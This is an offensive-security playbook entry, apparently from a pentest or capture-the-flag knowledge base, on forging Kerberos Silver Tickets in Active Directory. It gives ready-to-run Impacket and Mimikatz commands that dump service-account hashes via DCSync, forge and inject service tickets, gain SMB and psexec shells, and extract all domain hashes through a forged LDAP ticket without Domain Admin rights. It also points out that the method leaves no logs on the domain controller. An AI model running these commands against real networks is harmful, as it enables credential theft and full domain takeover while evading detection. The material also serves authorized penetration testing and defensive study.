---
id: silver-ticket
title: Silver Ticket
stage: objective
tags: [windows, ad, kerberos]
summary: Forge a TGS for a specific service using the service account's NTLM hash — bypasses the KDC entirely and leaves no DC-side logs.
leads_to:
  - system-shell
  - pivot
---

## Prerequisites

A service account or computer account's NTLM hash (from DCSync, SAM dump, or secretsdump). Domain SID. The SPN of the target service. Unlike Golden Tickets, the DC is never contacted during use — only the target service validates the ticket.

A Silver Ticket is a forged TGS (service ticket) signed with the NTLM hash of the service account or machine account. It grants access to one specific service on one specific machine. The key advantage over Golden Tickets: no KDC contact during use means no Kerberos logs at the DC. Forge `ldap/$DC` tickets to enable DCSync without DA credentials.

## Quick Win

> Forge a cifs ticket for SMB access to the target machine as Administrator.

```bash
impacket-ticketer -spn cifs/$TARGET.domain.local \
  -domain-sid S-1-5-21-... -nthash SERVICE_NTLM_HASH -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

## What You Need

> Three values required — SID from secretsdump, hash from dump, SPN determines the access.

```bash
# 1. Domain SID
impacket-getPac -targetUser Administrator domain.local/user:pass -dc-ip $DC
# or: impacket-lookupsid domain.local/user:pass@$DC 0

# 2. Service account or computer account NTLM hash (from DCSync/secretsdump)
# 3. SPN — determines what service you access:
#    cifs/$TARGET      → SMB (C$, ADMIN$)
#    host/$TARGET      → Services, schtasks, WMI
#    http/$TARGET      → IIS web
#    mssqlsvc/$TARGET  → SQL Server
#    ldap/$DC          → LDAP / DCSync
```

## Forge with Impacket (Linux)

> Creates `.ccache` — use KRB5CCNAME to authenticate with any impacket tool.

```bash
impacket-ticketer \
  -spn cifs/$TARGET.domain.local \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -nthash SERVICE_NTLM_HASH \
  -domain domain.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass domain.local/Administrator@$TARGET
impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

## Forge with Mimikatz (Windows)

> `kerberos::golden` is used for silver tickets too — `/service:` specifies the ticket type.

```powershell
mimikatz.exe

# Dump service/computer account hash first
lsadump::dcsync /domain:domain.local /user:TARGET_COMPUTER$

# Forge and inject
kerberos::golden \
  /domain:domain.local \
  /sid:S-1-5-21-... \
  /target:$TARGET.domain.local \
  /service:cifs \
  /rc4:SERVICE_NTLM_HASH \
  /user:Administrator \
  /ptt

klist
dir \\$TARGET\C$
```

## LDAP Silver Ticket → DCSync Without DA

> Forge an LDAP ticket for the DC → enables secretsdump without being in Domain Admins.

```bash
impacket-ticketer \
  -spn ldap/$DC.domain.local \
  -domain-sid $SID \
  -nthash DC_COMPUTER_NTLM_HASH \
  -domain domain.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass domain.local/Administrator@$DC
```

## Common Silver Ticket SPNs

| SPN | Access |
|-----|--------|
| `cifs/$TARGET` | SMB file shares (C$, ADMIN$) |
| `host/$TARGET` | Services, schtasks, WMI |
| `http/$TARGET` | IIS web apps |
| `mssqlsvc/$TARGET` | SQL Server |
| `ldap/$DC` | LDAP queries and DCSync |

## Leads To

cifs silver ticket → SMB shell on target → system-shell. ldap silver ticket → DCSync for domain hashes without DA membership. host silver ticket → schtasks/service manipulation on target. Computer account hash changes every 30 days — use the current hash from a fresh DCSync.
